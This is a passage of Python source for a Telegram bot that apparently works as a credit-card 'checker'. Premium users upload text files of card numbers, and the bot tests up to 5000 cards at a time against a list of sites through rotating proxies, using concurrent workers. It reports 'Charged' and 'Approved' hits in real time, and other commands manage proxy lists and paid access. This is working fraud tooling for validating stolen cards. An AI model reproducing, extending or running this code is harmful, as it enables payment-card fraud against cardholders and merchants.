        await status_msg.edit(premium_emoji(f"❌ Error checking card: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/chk'))
async def mass_check_command(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this bot."), parse_mode='html')
        return

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Please reply to a .txt file containing cards."), parse_mode='html')
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Please reply to a .txt file."), parse_mode='html')
        return

    if not load_sites():
        await event.reply(premium_emoji("❌ No sites available. Please contact admin."), parse_mode='html')
        return
    if not load_proxies():
        await event.reply(premium_emoji("❌ No proxies available. Please add proxies to proxy.txt."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji("🔄 Processing your file..."), parse_mode='html')

    file_path = await reply_msg.download_media()

    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()

    cards = extract_cc(content)

    if not cards:
        await status_msg.edit(premium_emoji("❌ No valid cards found in file."), parse_mode='html')
        os.remove(file_path)
        return

    if len(cards) > 5000:
        await status_msg.edit(premium_emoji(f"⚠️ File contains {len(cards)} cards. Limiting to first 5000 cards."), parse_mode='html')
        cards = cards[:5000]

    os.remove(file_path)

    total_cards = len(cards)
    await status_msg.edit(premium_emoji(f"🔄 Starting check for {total_cards} cards..."), parse_mode='html')

    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}

    all_results = {
        'charged': [],
        'approved': [],
        'dead': [],
        'total': total_cards,
        'checked': 0,
        'start_time': time.time()
    }

    try:
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)
            
        last_update_time = [time.time()]

        async def worker():
            while not queue.empty() and session_key in active_sessions:
                session_state = active_sessions.get(session_key)
                if not session_state:
                    break
                while session_state.get('paused', False):
                    await asyncio.sleep(1)
                    session_state = active_sessions.get(session_key)
                    if not session_state:
                        return
                        
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                    
                current_sites = load_sites()
                current_proxies = load_proxies()
                if not current_sites or not current_proxies:
                    break
                
                res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=1)
                
                all_results['checked'] += 1
                
                if res['status'] == 'Charged':
                    all_results['charged'].append(res)
                    await save_user_stats(user_id, was_successful=True)
                    await send_realtime_hit(user_id, res, 'Charged', '')
                elif res['status'] == 'Approved':
                    all_results['approved'].append(res)
                    await save_user_stats(user_id, was_successful=True)
                    await send_realtime_hit(user_id, res, 'Approved', '')
                else:
                    all_results['dead'].append(res)
                    await save_user_stats(user_id, was_successful=False)
                    
                queue.task_done()
                
                now = time.time()
                if now - last_update_time[0] >= 1.0:
                    last_update_time[0] = now
                    if session_key in active_sessions:
                        try:
                            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
                        except Exception:
                            pass

        workers = [asyncio.create_task(worker()) for _ in range(10)]
        
        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)
        
        if session_key in active_sessions:
            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])

    except Exception as e:
        await bot.send_message(user_id, premium_emoji(f"❌ An error occurred: {e}"), parse_mode='html')
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]

        try:
            await status_msg.delete()
        except:
            pass

        await send_final_results(user_id, all_results)

@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_check_command(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>"), parse_mode='html')
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies to check."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(f"🔥 Checking {len(proxies)} proxies..."), parse_mode='html')

    alive_proxies = []
    dead_proxies = []
    batch_size = 50

    for i in range(0, len(proxies), batch_size):
        batch = proxies[i:i + batch_size]
        tasks = [test_proxy(proxy) for proxy in batch]
        results = await asyncio.gather(*tasks)

        for res in results:
            if res['status'] == 'alive':
                alive_proxies.append(res['proxy'])
            else:
                dead_proxies.append(res['proxy'])

        await status_msg.edit(
            premium_emoji(
                f"🔥 Checking proxies...\n\n"
                f"<b>Checked:</b> {len(alive_proxies) + len(dead_proxies)}/{len(proxies)}\n"
                f"<b>Alive:</b> {len(alive_proxies)}\n"
                f"<b>Dead:</b> {len(dead_proxies)}"
            ),
            parse_mode='html'
        )

    save_proxies(alive_proxies)

    summary = f"""✅ <b>Proxy Check Complete!</b>

<b>Total Proxies:</b> {len(proxies)}
<b>Alive:</b> {len(alive_proxies)}
<b>Removed:</b> {len(dead_proxies)}

<code>proxy.txt</code> has been updated with only working proxies."""

    await status_msg.edit(premium_emoji(summary), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addproxy'))
async def add_proxy_command(event):
    user_id = event.sender_id
    
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>"), parse_mode='html')
        return

    try:
        args = event.message.text.split('\n')
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/addproxy</code> followed by proxies, one per line."), parse_mode='html')
            return

        proxies_to_add = [line.strip() for line in args[1:] if line.strip()]
        if not proxies_to_add:
            await event.reply(premium_emoji("❌ No proxies provided."), parse_mode='html')
            return

        current_proxies = load_proxies()
        new_proxies = []

        for proxy in proxies_to_add:
            if proxy not in current_proxies:
                new_proxies.append(proxy)

        if not new_proxies:
            await event.reply(premium_emoji("⚠️ All provided proxies already exist."), parse_mode='html')
            return

        async with aiofiles.open(PROXY_FILE, 'a') as f:
            for proxy in new_proxies:
                await f.write(f"{proxy}\n")

        await event.reply(premium_emoji(f"✅ <b>Proxies Added!</b>\n\nAdded {len(new_proxies)} new proxies."), parse_mode='html')

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/chkproxy\s+'))
async def check_single_proxy_command(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>"), parse_mode='html')
        return

    proxy = event.message.text.split(' ', 1)[1].strip()
    if not proxy:
        await event.reply(premium_emoji("❌ Usage: <code>/chkproxy ip:port:user:pass</code>"), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(f"🔄 Checking proxy: <code>{proxy}</code>..."), parse_mode='html')

    try:
        result = await test_proxy(proxy)

        if result['status'] == 'alive':
            await status_msg.edit(premium_emoji(f"✅ <b>Proxy is ALIVE!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
        else:
            await status_msg.edit(premium_emoji(f"❌ <b>Proxy is DEAD!</b>\n\n<code>{proxy}</code>"), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmproxy\s+'))
async def remove_single_proxy_command(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>"), parse_mode='html')
        return

    proxy_to_remove = event.message.text.split(' ', 1)[1].strip()
    if not proxy_to_remove:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxy ip:port:user:pass</code>"), parse_mode='html')
        return

    current_proxies = load_proxies()

    if proxy_to_remove not in current_proxies:
        await event.reply(premium_emoji(f"❌ Proxy not found: <code>{proxy_to_remove}</code>"), parse_mode='html')
        return

    new_proxies = [p for p in current_proxies if p != proxy_to_remove]
    save_proxies(new_proxies)

    await event.reply(premium_emoji(f"✅ <b>Proxy Removed!</b>\n\n<code>{proxy_to_remove}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmproxyindex\s+'))
async def remove_proxy_by_index_command(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>"), parse_mode='html')
        return

    indices_str = event.message.text.split(' ', 1)[1].strip()
    if not indices_str:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxyindex 1,2,3</code>"), parse_mode='html')
        return

    try:
        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid indices. Use numbers separated by commas."), parse_mode='html')
        return

    current_proxies = load_proxies()

    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in proxy.txt"), parse_mode='html')
        return

    removed = []
    new_proxies = []
    for i, proxy in enumerate(current_proxies):
        if i in indices:
            removed.append(proxy)
        else:
            new_proxies.append(proxy)

    if not removed:
        await event.reply(premium_emoji("❌ No valid indices found."), parse_mode='html')
        return

    save_proxies(new_proxies)

    removed_text = "\n".join(removed[:10])
    if len(removed) > 10:
        removed_text += "..."
    
    await event.reply(premium_emoji(f"✅ <b>Removed {len(removed)} proxies!</b>\n\nRemoved:\n<code>{removed_text}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/clearproxy'))
async def clear_proxies_command(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>"), parse_mode='html')
        return

    current_proxies = load_proxies()
    count = len(current_proxies)

    if count == 0:
        await event.reply(premium_emoji("❌ No proxies to clear."), parse_mode='html')
        return

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_filename = f"proxy_backup_{user_id}_{timestamp}.txt"

    try:
        async with aiofiles.open(backup_filename, 'w') as f:
            for proxy in current_proxies:
                await f.write(f"{proxy}\n")

        await event.reply(
            premium_emoji(f"📦 <b>Backup Created!</b>\n\nBackup of {count} proxies attached."),
            file=backup_filename,
            parse_mode='html'
        )

        try:
            os.remove(backup_filename)
        except:
            pass

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error creating backup: {e}"), parse_mode='html')
        return

    save_proxies([])

    await event.reply(premium_emoji(f"✅ <b>Cleared all {count} proxies!</b>\n\n<code>proxy.txt</code> is now empty."), parse_mode='html')

@bot.on(events.NewMessage(pattern='/getproxy'))
async def get_proxies_command(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>"), parse_mode='html')
        return

    current_proxies = load_proxies()

    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in <code>proxy.txt</code>"), parse_mode='html')
        return

    if len(current_proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies)])
        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(current_proxies)}):</b>\n\n{proxy_list}"), parse_mode='html')
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"

        async with aiofiles.open(filename, 'w') as f:
            for i, proxy in enumerate(current_proxies):
                await f.write(f"{i+1}. {proxy}\n")

        await event.reply(
            premium_emoji(f"<b>📋 All Proxies ({len(current_proxies)}):</b>\n\nFile attached below."),
            file=filename,
            parse_mode='html'
        )

        try:
            os.remove(filename)
        except:
            pass

@bot.on(events.NewMessage(pattern='/addpremium'))
async def add_premium_command(event):
    user_id = event.sender_id
    
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>Only admin can use this command.</b>"), parse_mode='html')
        return
    
    args = event.message.text.split()
    if len(args) < 2:
        await event.reply(premium_emoji("❌ <b>Usage:</b> <code>/addpremium user_id</code>\n\nExample: <code>/addpremium 123456789</code>"), parse_mode='html')
        return
    
    target_id = args[1].strip()
    
    premium_users = load_premium_users()
    if target_id in premium_users:
        await event.reply(premium_emoji(f"⚠️ <b>User {target_id} is already premium.</b>"), parse_mode='html')
        return
    
    with open(PREMIUM_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{target_id}\n")
    
    await event.reply(premium_emoji(f"✅ <b>User {target_id} is now premium!</b>"), parse_mode='html')
    
@bot.on(events.NewMessage(pattern='/removepremium'))
async def remove_premium_command(event):
    user_id = event.sender_id
    
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>Only admin can use this command.</b>"), parse_mode='html')
        return
    
    args = event.message.text.split()
    if len(args) < 2:
        await event.reply(premium_emoji("❌ <b>Usage:</b> <code>/removepremium user_id</code>\n\nExample: <code>/removepremium 123456789</code>"), parse_mode='html')
        return
    
    target_id = args[1].strip()
    
    premium_users = load_premium_users()
    if target_id not in premium_users:
        await event.reply(premium_emoji(f"⚠️ <b>User {target_id} is not premium.</b>"), parse_mode='html')
        return
    
    new_premium = [uid for uid in premium_users if uid != target_id]
    with open(PREMIUM_FILE, 'w', encoding='utf-8') as f:
        for uid in new_premium:
            f.write(f"{uid}\n")
    
    await event.reply(premium_emoji(f"✅ <b>User {target_id} is no longer premium.</b>"), parse_mode='html')
    
@bot.on(events.NewMessage(pattern='/premiumlist'))
async def premium_list_command(event):
    user_id = event.sender_id
    
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>Only admin can use this command.</b>"), parse_mode='html')
        return
    
    premium_users = load_premium_users()
    
    if not premium_users:
        await event.reply(premium_emoji("📋 <b>No premium users found.</b>"), parse_mode='html')
        return
    
    text = "<b>📋 Premium Users:</b>\n\n"
    for i, uid in enumerate(premium_users, 1):
        text += f"{i}. <code>{uid}</code>\n"
    
    await event.reply(premium_emoji(text), parse_mode='html')

@bot.on(events.NewMessage(pattern='/id'))
async def get_id_command(event):
    user_id = event.sender_id
    chat_id = event.chat_id
    
    text = f"<b>Your User ID:</b> <code>{user_id}</code>"
    if event.is_group:
        text += f"\n<b>Chat ID:</b> <code>{chat_id}</code>"
    
    await event.reply(premium_emoji(text), parse_mode='html')

@bot.on(events.CallbackQuery(pattern=b"pause"))
async def pause_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = True
        await event.answer("⏸️ Paused")

@bot.on(events.CallbackQuery(pattern=b"resume"))
async def resume_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = False
        await event.answer("▶️ Resumed")

@bot.on(events.CallbackQuery(pattern=b"stop"))
async def stop_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        del active_sessions[session_key]
        await event.answer("🛑 Stopped")
        await event.edit(premium_emoji("🛑 <b>Checking stopped by user.</b>"), parse_mode='html')
async def auto_add_admins():
    for admin_id in ADMIN_IDS:
        admin_id_str = str(admin_id)
        premium_users = load_premium_users()
        if admin_id_str not in premium_users:
            with open(PREMIUM_FILE, 'a', encoding='utf-8') as f:
                f.write(f"{admin_id_str}\n")
            print(f"✅ Admin {admin_id_str} added to premium automatically!")
asyncio.get_event_loop().run_until_complete(auto_add_admins())
print("✅ Bot started successfully!")
print("⚡ Bot By: @afuonax")

bot.run_until_disconnected()
